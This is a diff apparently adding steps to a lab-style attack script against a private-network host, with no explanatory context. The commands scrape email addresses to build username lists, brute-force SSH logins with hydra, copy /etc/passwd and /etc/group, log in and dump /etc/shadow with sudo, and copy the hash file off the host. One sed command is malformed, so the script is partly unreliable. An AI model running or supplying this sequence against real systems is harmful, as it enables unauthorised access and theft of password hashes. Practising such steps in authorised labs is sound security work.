@@ -2,3 +2,9 @@ curl 192.168.1.100/index2.php|grep @ > emails
 sed "s/^.*- //g;s/@.*//g" emails > users
 sed "s/^\(.\)/\1\0;s/.$//" users >> users
 hydra -L users -P users ssh://192.168.1.100
+scp bbanter@192.168.1.100:/etc/passwd .
+scp bbanter@192.168.1.100:/etc/group .
+hydra -l aadams -P dictionary ssh://192.168.1.100
+ssh aadams@192.168.1.100
+	sudo cat /etc/shadow > shadow
+scp aadams@192.168.1.100:shadow .
